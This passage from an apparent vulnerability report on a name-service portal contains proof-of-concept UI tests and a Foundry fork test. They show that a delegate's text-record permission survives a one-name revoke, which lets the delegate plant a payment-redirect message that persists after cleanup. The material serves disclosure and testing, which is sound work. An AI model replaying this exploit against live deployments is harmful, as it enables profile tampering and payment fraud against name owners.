        .closest('tr') as HTMLElement
      expect(within(currentDelegateRow).getByText(TREASURY)).toBeTruthy()
      expect(within(currentDelegateRow).queryByText(DECOY)).toBeNull()
    })

    expect(delegateCanSetText()).toBe(true)
    expect(
      mocks.overview.roles.some(
        (role) =>
          role.account.toLowerCase() === VICTIM.toLowerCase() &&
          role.resource.toLowerCase() === ROOT_RESOURCE &&
          BigInt(role.roleBitmap) === VICTIM_REQUIRED_ROOT_BITMAP,
      ),
    ).toBe(true)
    expect(screen.getByRole('button', { name: 'Add user' })).toBeTruthy()
    expect(mocks.outboundFetch).not.toHaveBeenCalled()

    console.log('route=/resolver/$address/roles')
    console.log('connected_gate=ROLE_SET_ADDR:true')
    console.log(
      'victim_root_bitmap=ROLE_SET_ADDR|ROLE_SET_ADDR_ADMIN|ROLE_SET_TEXT_ADMIN',
    )
    console.log(`submitted_function=${submitted.functionName}`)
    console.log('submitted_scope=decoy-victim.eth')
    console.log('refetched_survivor=treasury-victim.eth:ROLE_SET_TEXT')
    console.log('connected_victim_authority_after_refetch=unchanged')
  })

  it('correct two-name revoke intents remove all delegate SET_TEXT authority', () => {
    const nameIntent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: DECOY,
      account: DELEGATE,
      roles: ['ROLE_SET_TEXT'],
      walletClient: mocks.walletClient,
      chainId: CHAIN_ID,
    })
    const treasuryIntent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: TREASURY,
      account: DELEGATE,
      roles: ['ROLE_SET_TEXT'],
      walletClient: mocks.walletClient,
      chainId: CHAIN_ID,
    })

    applyResolverCall(nameIntent.request.data)
    applyResolverCall(treasuryIntent.request.data)

    expect(
      decodeFunctionData({ abi: roleAbi, data: nameIntent.request.data })
        .functionName,
    ).toBe('authorizeNameRoles')
    expect(
      decodeFunctionData({ abi: roleAbi, data: treasuryIntent.request.data })
        .functionName,
    ).toBe('authorizeNameRoles')
    expect(delegateCanSetText()).toBe(false)
    expect(
      mocks.overview?.roles.some(
        (role) => role.account.toLowerCase() === VICTIM.toLowerCase(),
      ),
    ).toBe(true)

    console.log('negative_control_calls=authorizeNameRoles(decoy)+authorizeNameRoles(treasury)')
    console.log('negative_control_delegate_set_text_authority=false')
    console.log('negative_control_victim_admin_authority=retained')
  })
})
```

#### `portal-profile-render.test.tsx`

```tsx
import { cleanup, render, screen } from '@testing-library/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { afterEach } from 'vitest'
const NAME = 'treasury-victim.eth'
const ATTACKER_TEXT = 'SEND ALL TREASURY PAYMENTS TO THE NEW ACCOUNT'
const mocks = vi.hoisted(() => ({
  params: undefined as Record<string, unknown> | undefined,
}))

vi.mock('@/features/profile/hooks/useRecords', () => ({
  getRecordsQueryOptions: (params: Record<string, unknown>) => {
    mocks.params = params
    return {
      queryKey: ['records', params],
      queryFn: async () => ({
        texts: [{ key: 'description', value: ATTACKER_TEXT }],
        coins: [],
      }),
    }
  },
}))
vi.mock('@/features/profile/components/NameAvatar', () => ({
  NameAvatar: () => null,
}))
vi.mock('@/features/profile/components/SocialRecord', () => ({
  SocialRecord: () => null,
}))
vi.mock('@/features/profile/components/CoinRecord', () => ({
  CoinRecord: () => null,
}))

import { NameProfileCard } from '../../../apps/portal/src/features/profile/components/NameProfileCard'

describe('LEAD-010 Portal persistent profile text', () => {
  afterEach(() => cleanup())

  it('requests description in the real profile component and renders the fork-proved replacement', async () => {
    const queryClient = new QueryClient({
      defaultOptions: { queries: { retry: false } },
    })
    render(
      <QueryClientProvider client={queryClient}>
        <NameProfileCard name={NAME} />
      </QueryClientProvider>,
    )

    expect(await screen.findByText(ATTACKER_TEXT)).toBeTruthy()
    expect(mocks.params).toEqual(
      expect.objectContaining({
        name: NAME,
        texts: expect.arrayContaining(['description']),
      }),
    )
    console.log(`portal_profile_name=${NAME}`)
    console.log('portal_profile_record=description')
    console.log(`portal_rendered_replacement=${ATTACKER_TEXT}`)
  })
})
```

#### `fork-poc/foundry.toml`

```toml
[profile.default]
src = "src"
test = "test"
out = "out"
cache_path = "cache"
solc_version = "0.8.30"
evm_version = "prague"
optimizer = true
optimizer_runs = 200
```

#### `fork-poc/src/Placeholder.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract Placeholder {}
```

#### `fork-poc/test/Lead010AggregateTextDeployedFork.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function warp(uint256 newTimestamp) external;
    function prank(address msgSender) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
    function envOr(string calldata name, string calldata defaultValue) external returns (string memory value);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVerifiableFactoryLike {
    function deployProxy(address implementation, uint256 salt, bytes memory data) external returns (address);
}

interface IPermissionedResolverLike {
    function initialize(address admin, uint256 bitmap, bytes[] calldata setters) external;
    function grantRootRoles(uint256 bitmap, address account) external returns (bool);
    function authorizeNameRoles(bytes calldata toName, uint256 bitmap, address account, bool grant)
        external
        returns (bool);
    function revokeRootRoles(uint256 bitmap, address account) external returns (bool);
    function roles(uint256 resource, address account) external view returns (uint256);
    function setText(bytes32 node, string calldata key, string calldata value) external;
    function text(bytes32 node, string calldata key) external view returns (string memory);
}

interface IUniversalResolverLike {
    function resolve(bytes calldata name, bytes calldata data) external view returns (bytes memory, address);
}

interface IETHRegistrarLike {
    function MIN_COMMITMENT_AGE() external view returns (uint64);
    function isAvailable(string calldata label) external view returns (bool);
    function makeCommitment(
        string calldata label,
        address owner,
        bytes32 secret,
        address subregistry,
        address resolver,
        uint64 duration,
        bytes32 referrer
    ) external pure returns (bytes32);
    function commit(bytes32 commitment) external;
    function getRegisterPrice(string calldata label, uint64 duration, address paymentToken)
        external
        view
        returns (uint256 base, uint256 premium);
    function register(
        string calldata label,
        address owner,
        bytes32 secret,
        address subregistry,
        address resolver,
        uint64 duration,
        address paymentToken,
        bytes32 referrer
    ) external returns (uint256 tokenId);
}

interface IRegistryLike {
    function getResolver(string calldata label) external view returns (address);
    function findOwner(string calldata label) external view returns (address);
}

/// @dev Every state change occurs on a local Foundry fork. No write reaches Sepolia.

contract Lead010AggregateTextDeployedForkTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    string constant DEFAULT_RPC = "https://sepolia.gateway.tenderly.co";
    uint256 constant PINNED_BLOCK = 11_673_299;

    IVerifiableFactoryLike constant FACTORY = IVerifiableFactoryLike(0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef);
    address constant RESOLVER_IMPL = 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e;
    IETHRegistrarLike constant REGISTRAR = IETHRegistrarLike(0xa88553F454b77203B0D036A05c894d555EAAa2Cc);
    IRegistryLike constant ETH_REGISTRY = IRegistryLike(0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2);
    IUniversalResolverLike constant UNIVERSAL =
        IUniversalResolverLike(0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe);
    IERC20Like constant USDC = IERC20Like(0x768F42455A2D082E23ceeF7d51e5787C82d67a39);

    // An ordinary EOA with Sepolia test USDC at the pinned block. It receives
    // no protocol-wide privilege and owns both registered names.
    address constant VICTIM = 0x55582D44C579114274Fa062E07F09119E678bE7f;
    address constant DELEGATE = 0x2222222222222222222222222222222222222222;

    string constant DECOY_LABEL = "decoy-victim";
    string constant TREASURY_LABEL = "treasury-victim";
    string constant RECORD_KEY = "description";
    string constant ORIGINAL_TEXT = "Official treasury profile";
    string constant ATTACKER_TEXT = "SEND ALL TREASURY PAYMENTS TO THE NEW ACCOUNT";
    string constant REPAIRED_TEXT = "Official treasury profile restored";

    uint64 constant DURATION = 365 days;
    uint256 constant ROLE_SET_ADDR = 1;
    uint256 constant ROLE_SET_TEXT = 16;
    uint256 constant ROLE_SET_ADDR_ADMIN = ROLE_SET_ADDR << 128;
    uint256 constant ROLE_SET_TEXT_ADMIN = ROLE_SET_TEXT << 128;
    uint256 constant VICTIM_REQUIRED_ROOT_BITMAP =
        ROLE_SET_ADDR | ROLE_SET_ADDR_ADMIN | ROLE_SET_TEXT_ADMIN;
    uint256 constant ALL_ROLES = 0x1111111111111111111111111111111111111111111111111111111111111111;

    // Exact calls captured from the frozen mounted Portal with each raw row
    // order. The sole difference is the first name chosen by roleName = find().
    bytes constant PORTAL_REMOVE_DECOY =
        hex"bbd9abb5000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000100000000000000000000000002222222222222222222222222222222222222222000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120c6465636f792d76696374696d03657468000000000000000000000000000000";
    bytes constant PORTAL_REMOVE_TREASURY =
        hex"bbd9abb5000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000100000000000000000000000002222222222222222222222222222222222222222000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000150f74726561737572792d76696374696d03657468000000000000000000000000";

    event log_named_address(string key, address val);
    event log_named_uint(string key, uint256 val);
    event log_named_string(string key, string val);

    IPermissionedResolverLike resolver;
    bytes decoyName;
    bytes treasuryName;
    bytes32 decoyNode;
    bytes32 treasuryNode;
    uint256 decoyResource;
    uint256 treasuryResource;

    function setUp() public {
        vm.createSelectFork(vm.envOr("SEPOLIA_RPC_URL", DEFAULT_RPC), PINNED_BLOCK);
        require(
            address(FACTORY).code.length > 0 && RESOLVER_IMPL.code.length > 0 && address(UNIVERSAL).code.length > 0,
            "frozen deployment absent"
        );
        require(REGISTRAR.isAvailable(DECOY_LABEL) && REGISTRAR.isAvailable(TREASURY_LABEL), "labels unavailable");

        bytes[] memory setters = new bytes[](0);
        bytes memory init = abi.encodeCall(IPermissionedResolverLike.initialize, (VICTIM, ALL_ROLES, setters));
        vm.prank(VICTIM);
        resolver = IPermissionedResolverLike(
            FACTORY.deployProxy(RESOLVER_IMPL, uint256(keccak256("lead010-high46-resolver")), init)
        );

        _register(DECOY_LABEL, keccak256("lead010-high46-decoy"));
        _register(TREASURY_LABEL, keccak256("lead010-high46-treasury"));

        decoyName = _dns(DECOY_LABEL);
        treasuryName = _dns(TREASURY_LABEL);
        decoyNode = _namehash(DECOY_LABEL);
        treasuryNode = _namehash(TREASURY_LABEL);
        decoyResource = _resource(decoyNode);
        treasuryResource = _resource(treasuryNode);

        vm.startPrank(VICTIM);
        // Both resources have identical victim and delegate permissions.
        resolver.authorizeNameRoles(decoyName, ROLE_SET_TEXT | ROLE_SET_TEXT_ADMIN, VICTIM, true);
        resolver.authorizeNameRoles(treasuryName, ROLE_SET_TEXT | ROLE_SET_TEXT_ADMIN, VICTIM, true);
        resolver.authorizeNameRoles(decoyName, ROLE_SET_TEXT, DELEGATE, true);
        resolver.authorizeNameRoles(treasuryName, ROLE_SET_TEXT, DELEGATE, true);
        resolver.setText(decoyNode, RECORD_KEY, ORIGINAL_TEXT);
        resolver.setText(treasuryNode, RECORD_KEY, ORIGINAL_TEXT);
        // Retain exactly the root manager/admin state used by the mounted
        // frozen route; the delegate still has no root role.
        resolver.revokeRootRoles(ALL_ROLES ^ VICTIM_REQUIRED_ROOT_BITMAP, VICTIM);
        vm.stopPrank();

        require(ETH_REGISTRY.findOwner(DECOY_LABEL) == VICTIM, "victim not decoy owner");
        require(ETH_REGISTRY.findOwner(TREASURY_LABEL) == VICTIM, "victim not treasury owner");
        require(ETH_REGISTRY.getResolver(DECOY_LABEL) == address(resolver), "decoy resolver mismatch");
        require(ETH_REGISTRY.getResolver(TREASURY_LABEL) == address(resolver), "treasury resolver mismatch");
        require(resolver.roles(0, VICTIM) == VICTIM_REQUIRED_ROOT_BITMAP, "victim route/admin root state mismatch");
        require(resolver.roles(0, DELEGATE) == 0, "delegate root role remained");
        require(resolver.roles(decoyResource, DELEGATE) == ROLE_SET_TEXT, "bad decoy delegate seed");
        require(resolver.roles(treasuryResource, DELEGATE) == ROLE_SET_TEXT, "bad treasury delegate seed");
    }

    function test_DecoyFirst_RemoveSucceeds_TreasuryTextPersistsPastRoleCleanup() public {
        _exerciseOneResourceRemove(
            PORTAL_REMOVE_DECOY,
            decoyResource,
            treasuryResource,
            treasuryName,
            treasuryNode,
            "decoy-victim.eth",
            "treasury-victim.eth"
        );
    }

    function test_TreasuryFirst_RemoveSucceeds_DecoyTextPersistsPastRoleCleanup() public {
        _exerciseOneResourceRemove(
            PORTAL_REMOVE_TREASURY,
            treasuryResource,
            decoyResource,
            decoyName,
            decoyNode,
            "treasury-victim.eth",
            "decoy-victim.eth"
        );
    }

    function test_NegativeControl_CorrectTwoResourceRevokeBlocksBothTextWrites() public {
        vm.startPrank(VICTIM);
        require(resolver.authorizeNameRoles(decoyName, ROLE_SET_TEXT, DELEGATE, false), "decoy revoke failed");
        require(resolver.authorizeNameRoles(treasuryName, ROLE_SET_TEXT, DELEGATE, false), "treasury revoke failed");
        vm.stopPrank();

        require(resolver.roles(decoyResource, DELEGATE) == 0, "decoy role survived correct revoke");
        require(resolver.roles(treasuryResource, DELEGATE) == 0, "treasury role survived correct revoke");
        require(!_delegateCanSetText(decoyNode, ATTACKER_TEXT), "delegate wrote decoy after correct revoke");
        require(!_delegateCanSetText(treasuryNode, ATTACKER_TEXT), "delegate wrote treasury after correct revoke");
        require(_equal(resolver.text(decoyNode, RECORD_KEY), ORIGINAL_TEXT), "decoy text changed");
        require(_equal(resolver.text(treasuryNode, RECORD_KEY), ORIGINAL_TEXT), "treasury text changed");

        emit log_named_string("negative_control", "two resource revokes block both delegate writes");
    }

    function _exerciseOneResourceRemove(
        bytes memory portalCalldata,
        uint256 selectedResource,
        uint256 survivorResource,
        bytes memory survivorName,
        bytes32 survivorNode,
        string memory selectedLabel,
        string memory survivorLabel
    ) internal {
        vm.prank(VICTIM);
        (bool ok, bytes memory result) = address(resolver).call(portalCalldata);
        require(ok && abi.decode(result, (bool)), "advertised remove failed");
        require(resolver.roles(selectedResource, DELEGATE) == 0, "selected role survived");
        require(resolver.roles(survivorResource, DELEGATE) == ROLE_SET_TEXT, "other role was removed");

        // The advertised removal has succeeded; this write occurs before the
        // owner discovers and revokes the omitted resource.
        vm.prank(DELEGATE);
        resolver.setText(survivorNode, RECORD_KEY, ATTACKER_TEXT);
        require(_equal(resolver.text(survivorNode, RECORD_KEY), ATTACKER_TEXT), "replacement did not persist");
        (bytes memory answer, address usedResolver) = UNIVERSAL.resolve(
            survivorName, abi.encodeWithSignature("text(bytes32,string)", survivorNode, RECORD_KEY)
        );
        require(usedResolver == address(resolver), "wrong Universal Resolver path");
        require(_equal(abi.decode(answer, (string)), ATTACKER_TEXT), "Universal Resolver text mismatch");

        // Removing the surviving authority blocks future writes but does not
        // revert the already-persisted description.
        vm.prank(VICTIM);
        require(resolver.authorizeNameRoles(survivorName, ROLE_SET_TEXT, DELEGATE, false), "cleanup failed");
        require(resolver.roles(survivorResource, DELEGATE) == 0, "role survived cleanup");
        require(_equal(resolver.text(survivorNode, RECORD_KEY), ATTACKER_TEXT), "role cleanup repaired text");
        require(!_delegateCanSetText(survivorNode, "SECOND ATTACKER WRITE"), "delegate wrote after cleanup");
        require(_equal(resolver.text(survivorNode, RECORD_KEY), ATTACKER_TEXT), "failed write changed text");

        // The owner needs a distinct record-repair transaction.
        vm.prank(VICTIM);
        resolver.setText(survivorNode, RECORD_KEY, REPAIRED_TEXT);
        require(_equal(resolver.text(survivorNode, RECORD_KEY), REPAIRED_TEXT), "explicit repair failed");

        emit log_named_uint("pinned_block", PINNED_BLOCK);
        emit log_named_address("deployed_permissioned_resolver_impl", RESOLVER_IMPL);
        emit log_named_address("deployed_factory", address(FACTORY));
        emit log_named_address("ordinary_two_name_owner", VICTIM);
        emit log_named_address("delegate", DELEGATE);
        emit log_named_string("Portal_selected_scope", selectedLabel);
        emit log_named_string("Portal_omitted_scope", survivorLabel);
        emit log_named_uint("Portal_bitmap", ROLE_SET_TEXT);
        emit log_named_uint("victim_route_admin_root_bitmap", VICTIM_REQUIRED_ROOT_BITMAP);
        emit log_named_uint("delegate_root_bitmap", resolver.roles(0, DELEGATE));
        emit log_named_string("deployed_Universal_Resolver_text", abi.decode(answer, (string)));
        emit log_named_string("attacker_replacement_text", ATTACKER_TEXT);
        emit log_named_string("text_after_role_cleanup", ATTACKER_TEXT);
        emit log_named_string("text_after_explicit_record_repair", REPAIRED_TEXT);
    }

    function _delegateCanSetText(bytes32 node, string memory value) internal returns (bool) {
        vm.prank(DELEGATE);
        (bool ok,) =
            address(resolver).call(abi.encodeCall(IPermissionedResolverLike.setText, (node, RECORD_KEY, value)));
        return ok;
    }

    function _register(string memory label, bytes32 secret) internal {
        bytes32 commitment =
            REGISTRAR.makeCommitment(label, VICTIM, secret, address(0), address(resolver), DURATION, bytes32(0));
        uint256 committedAt = block.timestamp;
        vm.prank(VICTIM);
        REGISTRAR.commit(commitment);
        vm.warp(committedAt + REGISTRAR.MIN_COMMITMENT_AGE());
        (uint256 base, uint256 premium) = REGISTRAR.getRegisterPrice(label, DURATION, address(USDC));
        uint256 price = base + premium;
        require(USDC.balanceOf(VICTIM) >= price, "ordinary victim lacks test USDC");
        vm.startPrank(VICTIM);
        require(USDC.approve(address(REGISTRAR), price), "approve failed");
        REGISTRAR.register(label, VICTIM, secret, address(0), address(resolver), DURATION, address(USDC), bytes32(0));
        vm.stopPrank();
    }

    function _dns(string memory label) internal pure returns (bytes memory) {
        bytes memory raw = bytes(label);
        return abi.encodePacked(bytes1(uint8(raw.length)), raw, bytes1(uint8(3)), "eth", bytes1(0));
    }

    function _namehash(string memory label) internal pure returns (bytes32) {
        bytes32 ethNode = keccak256(abi.encodePacked(bytes32(0), keccak256("eth")));
        return keccak256(abi.encodePacked(ethNode, keccak256(bytes(label))));
    }

    function _resource(bytes32 node) internal pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(node, bytes32(0))));
    }

    function _equal(string memory a, string memory b) internal pure returns (bool) {
        return keccak256(bytes(a)) == keccak256(bytes(b));
    }
}
```

### Test boundaries

* The route test keeps the frozen route, table, sidebar, confirmation, intent builder, revoke builder, query invalidation and refetch. It replaces wallet/transaction transport, `hasRoles`, and indexer responses with deterministic boundaries and forbids outbound fetch.
* The profile test keeps the frozen `NameProfileCard` request/render logic. It stubs the ENS-record query boundary with the same name, key and value independently returned by Universal Resolver in the fork.
* The Foundry test runs deployed Sepolia implementation/factory/registry/registrar/Universal Resolver code at the pinned block. Its proxy, registrations and writes are local fork state only.
* The UI and fork processes are joined by hard-coded identical revoke `data` bytes. The UI fixture address is intentionally replaced by the locally deployed fork proxy; no claim of a live browser-to-fork process is made.
